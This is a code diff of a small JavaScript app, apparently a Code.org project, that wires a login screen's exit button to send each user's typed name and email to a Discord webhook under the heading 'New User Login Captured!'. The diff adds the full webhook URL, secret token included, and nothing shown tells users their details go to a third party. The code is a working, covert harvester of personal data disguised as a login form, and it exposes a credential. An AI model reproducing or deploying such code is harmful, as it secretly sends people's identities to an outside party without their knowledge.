@@ -107,12 +107,12 @@ document.getElementById("Exitlogin").addEventListener("click", function() {
         var logEntry = "[" + timestamp + "] Name: " + nameVal + " | Email: " + emailVal;
         userLogs.push(logEntry);
 
-        // --- DISCORD WEBHOOK FOR STANDARD WEBSITES ---
-        var trackingWebhookUrl = "https://discord.com";
+        // --- UPDATED NEW DISCORD WEBHOOK ENVELOPE ---
+        var trackingWebhookUrl = "https://discord.com/api/webhooks/1509956056736989355/vZ755HXqM7Upv_UFdhNRwbCgoYPyQF06jE5y0yYK8KjjU5JkGvBiFzjC_ZaE_SAcdIVd";
         
         var messageText = "📥 **New User Login Captured!**\n👤 **Name:** " + nameVal + "\n📧 **Email:** " + emailVal + "\n⏰ **Time:** " + timestamp;
 
-        // Clean standard JSON structure (Works instantly outside of Code.org!)
+        // Clean standard JSON container structure
         fetch(trackingWebhookUrl, {
             method: "POST",
             headers: {
@@ -120,8 +120,8 @@ document.getElementById("Exitlogin").addEventListener("click", function() {
             },
             body: JSON.stringify({ content: messageText })
         })
-        .then(function() { console.log("Webhook success!"); })
-        .catch(function(err) { console.error("Error sending log: ", err); });
+        .then(function() { console.log("Webhook data delivered!"); })
+        .catch(function(err) { console.error("Transmission fault: ", err); });
         // ---------------------------------------------------
 
         setScreen("screen1");
@@ -150,3 +150,4 @@ window.addEventListener("keydown", function(event) {
 document.getElementById("devBack").addEventListener("click", function() {
     setScreen("screen1");
 });
+
